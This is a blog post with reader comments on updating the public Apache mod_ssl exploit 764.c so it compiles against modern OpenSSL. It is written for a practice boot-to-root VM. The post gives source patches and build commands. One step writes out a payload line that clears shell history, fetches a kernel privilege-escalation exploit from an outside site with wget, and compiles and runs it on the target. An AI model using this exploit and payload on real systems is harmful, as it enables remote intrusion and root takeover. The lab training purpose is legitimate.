Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )
One of the popular boot-to-root VMs has an exploit (764.c) which doesn’t compile so well in modern Kali, producing the errors:

764d.c:643:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function)
764d.c:651:2: error: unknown type name ‘RC4_KEY’
764d.c:652:2: error: unknown type name ‘RC4_KEY’
764d.c:844:7: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
764d.c:845:19: error: ‘SSL2_MT_ERROR’ undeclared (first use in this function)
764d.c:882:2: error: unknown type name ‘MD5_CTX’
764d.c:887:23: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
764d.c:977:16: error: ‘SSL2_MT_SERVER_HELLO’ undeclared (first use in this function)
764d.c:1069:10: error: dereferencing pointer to incomplete type ‘EVP_PKEY {aka struct evp_pkey_st}’
764d.c:1106:2: error: unknown type name ‘MD5_CTX’
764d.c:1111:42: error: ‘MD5_DIGEST_LENGTH’ undeclared (first use in this function)
764d.c:1127:23: error: ‘RC4_KEY’ undeclared (first use in this function)
764d.c:1127:31: error: expected expression before ‘)’ token
764d.c:1131:32: error: expected expression before ‘)’ token
764d.c:1146:16: error: ‘SSL2_MT_SERVER_VERIFY’ undeclared (first use in this function)
764d.c:1158:11: error: ‘SSL2_MT_CLIENT_FINISHED’ undeclared (first use in this function)
764d.c:1171:16: error: ‘SSL2_MT_SERVER_FINISHED’ undeclared (first use in this function)


Luckily there was a blog post written in 2014 by @paulwebsec explaining how to update the exploit, which fixes some of them but still leaves you with:

764b.c:645:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function)
764b.c:847:19: error: ‘SSL2_MT_ERROR’ undeclared (first use in this function)
764b.c:979:16: error: ‘SSL2_MT_SERVER_HELLO’ undeclared (first use in this function)
764b.c:1071:10: error: dereferencing pointer to incomplete type ‘EVP_PKEY {aka struct evp_pkey_st}’
764b.c:1148:16: error: ‘SSL2_MT_SERVER_VERIFY’ undeclared (first use in this function)
764b.c:1160:11: error: ‘SSL2_MT_CLIENT_FINISHED’ undeclared (first use in this function)
764b.c:1173:16: error: ‘SSL2_MT_SERVER_FINISHED’ undeclared (first use in this function)

On Kali (and likely other Debian based distros) you can work around this by simply doing an “apt-get install libssl1.0-dev” to roll back your libssl-dev version, but why don’t we get this compiling with the modern lib…

Then changes to make (including Paul’s) are:

1. Add this below line 24 (the last #include):

#include <openssl/rc4.h>
#include <openssl/md5.h>

#define SSL2_MT_ERROR 0
#define SSL2_MT_CLIENT_FINISHED 3
#define SSL2_MT_SERVER_HELLO 4
#define SSL2_MT_SERVER_VERIFY 5
#define SSL2_MT_SERVER_FINISHED 6
#define SSL2_MAX_CONNECTION_ID_LENGTH 16

2. Replace “COMMAND2” on (now) line 672:

#define COMMAND2 “unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n”

3. Add “const” to the beginning of (now) line 970:

const unsigned char *p, *end;

4. Replace the “if” on (now) line 1078 with:

if (EVP_PKEY_get1_RSA(pkey) == NULL) {

5. Replace the “encrypted_key_length” code on (now) line 1084 with:

encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);

6. Install “libssl-dev” (if not already installed):

apt–get install libssl–dev

7. Compile!

# gcc -o 764 764.c -lcrypto

On Linux kali 4.15.0-kali2-amd64 #1 SMP Debian 4.15.11-1kali1 (2018-03-21) x86_64 GNU/Linux
With libssl-dev and not libssl1.0-dev
Got this using the steps outlined above:
764.c:672:18: error: ‘unset’ undeclared (first use in this function); did you mean ‘rset’?
…
Perform all the step again, except skipped step #2
Compiles and functional!

BTW, Thank you!

I only got this to work with apt-get install libssl1.0-dev
Installing libssl-dev alone or in conjunction overwrites the libssl import directives and it wont compile.

Thanks for the exploit!

Thank you so much for this! It’s unbelievable how often exploits need to be updated.
Exploit is written in 2003, had to be updated in 2014 and 2015. Now it was still not working without your updates. 🙂
Much appreciated..

Last thing: 764.c uses wget to download and compile ptrace-kmod.c unsuccessfully if you run kioptrix in an isolated network. I had to install c code on my kali and compile it on kioptrix to make it work.
